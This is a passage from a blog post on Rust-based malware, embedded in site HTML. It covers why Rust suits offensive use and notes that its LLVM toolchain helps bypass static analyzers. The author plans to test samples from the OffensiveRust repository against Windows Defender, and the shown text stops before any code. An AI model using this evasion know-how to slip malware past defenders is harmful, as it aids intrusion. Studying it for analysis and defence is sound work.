<!DOCTYPE html>
<html lang="en" class="h-full">
<head>
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-6E5Q6YSW8D"></script>
    <script data-cfasync="false">window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());gtag('config', 'G-6E5Q6YSW8D');</script>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="turbo-root" content="/retype">
    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.6.0.780241466473">

    <!-- See retype.com -->
    <meta name="generator" content="Retype 3.6.0">

    <!-- Primary Meta Tags -->
    <title>A Closer Look At Rust Based Malware</title>
    <meta name="title" content="A Closer Look At Rust Based Malware">
    <meta name="description" content="For Educational purpose only Spreading Malware is a violation of the law, so please don't create and send any malware using the tactics provided here...">

    <!-- Canonical -->
    <link rel="canonical" href="https://nxb1t.github.io/retype/malware-analysis/rust_malware/">

    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://nxb1t.github.io/retype/malware-analysis/rust_malware/">
    <meta property="og:title" content="A Closer Look At Rust Based Malware">
    <meta property="og:description" content="For Educational purpose only Spreading Malware is a violation of the law, so please don't create and send any malware using the tactics provided here...">
    <meta property="og:image" content="https://nxb1t.github.io/retype/assets/img/rust_malware/rustcover.png">

    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://nxb1t.github.io/retype/malware-analysis/rust_malware/">
    <meta property="twitter:title" content="A Closer Look At Rust Based Malware">
    <meta property="twitter:description" content="For Educational purpose only Spreading Malware is a violation of the law, so please don't create and send any malware using the tactics provided here...">
    <meta property="twitter:image" content="https://nxb1t.github.io/retype/assets/img/rust_malware/rustcover.png">

    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>

    <link href="../../favicon.ico" rel="icon">
    <link href="../../resources/css/retype.css?v=3.6.0.780241466473" rel="stylesheet">

    <script data-cfasync="false" src="../../resources/js/config.js?v=3.6.0.780241466473" data-turbo-eval="false" defer></script>
    <script data-cfasync="false" src="../../resources/js/retype.js?v=3.6.0" data-turbo-eval="false" defer></script>
    <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=3.6.0.780241466473" data-turbo-eval="false" defer></script>
    <script id="prism-js" data-cfasync="false" src="../../resources/js/prism.js?v=3.6.0.780241466473" defer></script>
</head>
<body>
    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
    
        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                <!-- Mobile menu button skeleton -->
                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
                <div v-cloak id="docs-sidebar-toggle"></div>
        
                <!-- Logo -->
                <div class="flex items-center justify-between h-full py-2 md:w-75">
                    <div class="flex items-center px-2 md:px-6">
                        <a id="docs-site-logo" href="../../" class="flex items-center leading-snug text-2xl">
                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">nxb1t</span>
                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">is-a.dev</span>
                    </div>
        
                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
                </div>
        
                <div class="flex justify-between md:grow">
                    <!-- Top Nav -->
                    <nav class="hidden md:flex">
                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://nxb1t.neocities.org" target="_blank">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                        <g fill="currentColor">
                                            <path d="M8.75 7a.75.75 0 0 0 0 1.5h7.5a.75.75 0 0 0 0-1.5h-7.5ZM7 11.75a.75.75 0 0 1 .75-.75h6.5a.75.75 0 0 1 0 1.5h-6.5a.75.75 0 0 1-.75-.75ZM9.75 15a.75.75 0 0 0 0 1.5h6.5a.75.75 0 0 0 0-1.5h-6.5Z"></path><path d="M2 3.75C2 2.784 2.784 2 3.75 2h16.5c.966 0 1.75.784 1.75 1.75v16.5A1.75 1.75 0 0 1 20.25 22H3.75A1.75 1.75 0 0 1 2 20.25Zm1.75-.25a.25.25 0 0 0-.25.25v16.5c0 .138.112.25.25.25h16.5a.25.25 0 0 0 .25-.25V3.75a.25.25 0 0 0-.25-.25Z"></path>
                                        </g>
                                    </svg>
                                    <span>CTF Writeups</span>
                                </a>
                            </li>
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/nxb1t" target="_blank">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                        <g fill="currentColor">
                                            <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
                                        </g>
                                    </svg>
                                    <span>GitHub</span>
                                </a>
                            </li>
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://www.linkedin.com/in/nashid-p-694842226" target="_blank">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                        <g fill="currentColor">
                                            <path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/>
                                        </g>
                                    </svg>
                                    <span>LinkedIn</span>
                                </a>
                            </li>
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://infosec.exchange/@nxb1t" target="_blank">
                                    <img class="mb-px mr-1" width="18" alt="" src="https://img.icons8.com/external-tal-revivo-color-tal-revivo/24/null/external-mastodon-is-an-online-self-hosted-social-media-and-social-networking-service-logo-color-tal-revivo.png">
                                    <span>Mastodon</span>
                                </a>
                            </li>
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://twitter.com/nxb1t4n6" target="_blank">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                        <g fill="currentColor">
                                            <path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-.139 9.237c.209 4.617-3.234 9.765-9.33 9.765-1.854 0-3.579-.543-5.032-1.475 1.742.205 3.48-.278 4.86-1.359-1.437-.027-2.649-.976-3.066-2.28.515.098 1.021.069 1.482-.056-1.579-.317-2.668-1.739-2.633-3.26.442.246.949.394 1.486.411-1.461-.977-1.875-2.907-1.016-4.383 1.619 1.986 4.038 3.293 6.766 3.43-.479-2.053 1.08-4.03 3.199-4.03.943 0 1.797.398 2.395 1.037.748-.147 1.451-.42 2.086-.796-.246.767-.766 1.41-1.443 1.816.664-.08 1.297-.256 1.885-.517-.439.656-.996 1.234-1.639 1.697z"/>
                                        </g>
                                    </svg>
                                    <span>Twitter</span>
                                </a>
                            </li>
        
                        </ul>
                    </nav>
        
                    <!-- Header Right Skeleton -->
                    <div v-cloak class="flex justify-end grow skeleton">
        
                        <!-- Search input mock -->
                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                            </div>
                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                        </div>
        
                        <!-- Mobile search button -->
                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                        </div>
        
                        <!-- Dark mode switch placeholder -->
                        <div class="w-10 h-10 lg:ml-2"></div>
        
                        <!-- History button -->
                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
                        </div>
                    </div>
        
                    <div v-cloak class="flex justify-end grow">
                        <div id="docs-mobile-search-button"></div>
                        <doc-search-desktop></doc-search-desktop>
        
                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
                        <doc-history></doc-history>
                    </div>
                </div>
            </div>
        </header>
    
        <div class="container relative flex bg-white">
            <!-- Sidebar Skeleton -->
            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
            
                <!-- Render this div, if config.showSidebarFilter is `true` -->
                <div class="flex items-center h-16 px-6">
                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
                </div>
            
                <div class="pl-6 mt-1 mb-4">
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                </div>
            
                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                        <span class="text-xs whitespace-nowrap">Powered by</span>
                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                    </a>
                </div>
            </div>
            
            <!-- Sidebar component -->
            <doc-sidebar v-cloak>
                <template #sidebar-footer>
                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
            
                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
                            <nav>
                                <ul class="flex flex-wrap justify-center items-center">
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://nxb1t.neocities.org" target="_blank">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                <g fill="currentColor">
                                                    <path d="M8.75 7a.75.75 0 0 0 0 1.5h7.5a.75.75 0 0 0 0-1.5h-7.5ZM7 11.75a.75.75 0 0 1 .75-.75h6.5a.75.75 0 0 1 0 1.5h-6.5a.75.75 0 0 1-.75-.75ZM9.75 15a.75.75 0 0 0 0 1.5h6.5a.75.75 0 0 0 0-1.5h-6.5Z"></path><path d="M2 3.75C2 2.784 2.784 2 3.75 2h16.5c.966 0 1.75.784 1.75 1.75v16.5A1.75 1.75 0 0 1 20.25 22H3.75A1.75 1.75 0 0 1 2 20.25Zm1.75-.25a.25.25 0 0 0-.25.25v16.5c0 .138.112.25.25.25h16.5a.25.25 0 0 0 .25-.25V3.75a.25.25 0 0 0-.25-.25Z"></path>
                                                </g>
                                            </svg>
                                            <span>CTF Writeups</span>
                                        </a>
                                    </li>
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/nxb1t" target="_blank">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                <g fill="currentColor">
                                                    <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
                                                </g>
                                            </svg>
                                            <span>GitHub</span>
                                        </a>
                                    </li>
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://www.linkedin.com/in/nashid-p-694842226" target="_blank">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                <g fill="currentColor">
                                                    <path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/>
                                                </g>
                                            </svg>
                                            <span>LinkedIn</span>
                                        </a>
                                    </li>
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://infosec.exchange/@nxb1t" target="_blank">
                                            <img class="mb-px mr-1" width="18" alt="" src="https://img.icons8.com/external-tal-revivo-color-tal-revivo/24/null/external-mastodon-is-an-online-self-hosted-social-media-and-social-networking-service-logo-color-tal-revivo.png">
                                            <span>Mastodon</span>
                                        </a>
                                    </li>
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://twitter.com/nxb1t4n6" target="_blank">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                <g fill="currentColor">
                                                    <path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-.139 9.237c.209 4.617-3.234 9.765-9.33 9.765-1.854 0-3.579-.543-5.032-1.475 1.742.205 3.48-.278 4.86-1.359-1.437-.027-2.649-.976-3.066-2.28.515.098 1.021.069 1.482-.056-1.579-.317-2.668-1.739-2.633-3.26.442.246.949.394 1.486.411-1.461-.977-1.875-2.907-1.016-4.383 1.619 1.986 4.038 3.293 6.766 3.43-.479-2.053 1.08-4.03 3.199-4.03.943 0 1.797.398 2.395 1.037.748-.147 1.451-.42 2.086-.796-.246.767-.766 1.41-1.443 1.816.664-.08 1.297-.256 1.885-.517-.439.656-.996 1.234-1.639 1.697z"/>
                                                </g>
                                            </svg>
                                            <span>Twitter</span>
                                        </a>
                                    </li>
            
                                </ul>
                            </nav>
                        </div>
            
                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                            <span class="text-xs whitespace-nowrap">Powered by</span>
                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                        </a>
                    </div>
                </template>
            </doc-sidebar>
    
            <div class="grow min-w-0 dark:bg-dark-850">
                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                <div class="flex">
                    <div class="min-w-0 p-4 grow md:px-16">
                        <main class="relative pb-12 lg:pt-2">
                            <div class="docs-markdown" id="docs-content">
                                <!-- Rendered if sidebar right is enabled -->
                                <div id="docs-sidebar-right-toggle"></div>
                                <!-- Page content  -->
<doc-anchor-target id="a-closer-look-at-rust-based-malware" class="break-words">
    <h1>
        <doc-anchor-trigger class="header-anchor-trigger" to="#a-closer-look-at-rust-based-malware">#</doc-anchor-trigger>
        <span>A Closer Look At Rust Based Malware</span>
    </h1>
</doc-anchor-target>
<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center">
    <div class="flex items-center">
        <div>By</div>
        <div class="ml-2 flex items-center">
          <div class="shrink-0 w-8 h-8 overflow-hidden rounded-full">
            <img class="object-cover" src="https://nxb1t.is-a.dev/assets/img/profile.jpeg">
          </div>
          <div class="ml-1 whitespace-nowrap text-gray-500 dark:text-dark-350">nxb1t</div>
        </div>
    </div>
    <div class="mx-2">&#9679;</div>
    <div>In&nbsp;</div>
    <div><a href="../../categories/malware-analysis/">Malware Analysis</a>,&nbsp;</div>
    <div><a href="../../categories/threat-hunting/">Threat Hunting</a>,&nbsp;</div>
    <div><a href="../../categories/threat-intelligence/">Threat Intelligence</a></div>
    <div class="mx-2">&#9679;</div>
    <div class="flex items-center shrink-0">Published&nbsp;<span>2023-02-27</span></div>
</div>

<p><figure class="content-center">
    <img src="../../assets/img/rust_malware/rustcover.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
</p>
<doc-anchor-target id="introduction">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#introduction">#</doc-anchor-trigger>
        <span>Introduction</span>
    </h2>
</doc-anchor-target>
<hr>
<div class="flex mb-6">
    <div class="shrink-0 w-1 rounded-tl rounded-bl bg-yellow-500"></div>
    <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
        <div class="flex items-center ml-4 h-7">
            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-yellow-500" width="22" height="22" viewBox="0 0 24 24" role="presentation">
                <g fill="currentColor"><g>
                    <path d="M22.48 15.59L14.01 1.45A2.968 2.968 0 0012.16.09c-.78-.19-1.58-.07-2.27.35-.41.25-.76.6-1.01 1.01v.01L.4 15.6c-.83 1.43-.33 3.27 1.1 4.1.45.26.95.4 1.48.4h16.95c.8-.01 1.55-.33 2.11-.9.56-.57.87-1.33.86-2.13a3.04 3.04 0 00-.42-1.48zm-1.87 2.21c-.19.19-.44.3-.69.3H2.99c-.17 0-.34-.05-.49-.13a.992.992 0 01-.37-1.35L10.6 2.48c.08-.14.2-.25.34-.33a.992.992 0 011.37.33l8.46 14.13c.09.15.13.32.13.49 0 .26-.1.51-.29.7z"></path>
                    <path d="M11.45 12.1c.55 0 1-.45 1-1v-4c0-.55-.45-1-1-1s-1 .45-1 1v4c0 .56.45 1 1 1zM11.46 14.1c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
                </g></g>
            </svg>
        </div>
        <div class="pr-5 ml-3 w-full">
            <h5>Disclaimer</h5>
<p>For Educational purpose only <br>
Spreading Malware is a violation of the law, so please don&#x27;t create and send any malware using the tactics provided here to anyone <br>
I am not responsible for any damage<br>
All the malware samples are created using the codes taken from <a href="https://github.com/trickster0/OffensiveRust">OffensiveRust</a> GitHub repository.</p>
        </div>
    </div>
</div>
<p>In recent years, we have seen a significant increase in the popularity of the Rust programming language. Debates have arisen around Rust&#x27;s speed, with some arguing that it is faster than C/C++. Notably, Rust has also been used to write kernel drivers for the Linux kernel, which previously only supported C and Assembly code. Furthermore, many popular command-line tools for Linux have been re-implemented in Rust. One such example is the well-known <a href="https://github.com/sharkdp/bat">bat</a> tool, a clone of <code v-pre>cat</code> with syntax highlighting and other features. These made me wonder why is Rust so popular? and how effective it would be for Offensive Purposes.</p>
<p>In this article, we will analyse some malicious Rust binaries and check their behavior against Windows Defender.</p>
<doc-anchor-target id="why-rust-so-special">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#why-rust-so-special">#</doc-anchor-trigger>
        <span>Why Rust So Special?</span>
    </h2>
</doc-anchor-target>
<hr>
<p>Rust is a multi-paradigm, high-level, general-purpose programming language. Rust emphasizes performance, type safety, and concurrency. Rust enforces memory safety—that is, that all references point to valid memory—without requiring the use of a garbage collector or reference counting present in other memory-safe languages.</p>
<ul>
<li>It is fast as C and C++ or sometimes even better.</li>
<li>It is LLVM based.</li>
<li>Easy to cross-compile.</li>
</ul>
<p>The main reason for its offensive capabilities is the LLVM toolchain, which makes it easier to bypass static analyzers.</p>
<doc-anchor-target id="overview-of-rust-binaries">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#overview-of-rust-binaries">#</doc-anchor-trigger>
        <span>Overview Of Rust Binaries</span>
    </h2>
</doc-anchor-target>
<hr>
<p>Before testing the Malware Samples, Let&#x27;s look at a simple calculator program in Rust.</p>
<doc-anchor-target id="creating-a-rust-project">
    <h3>
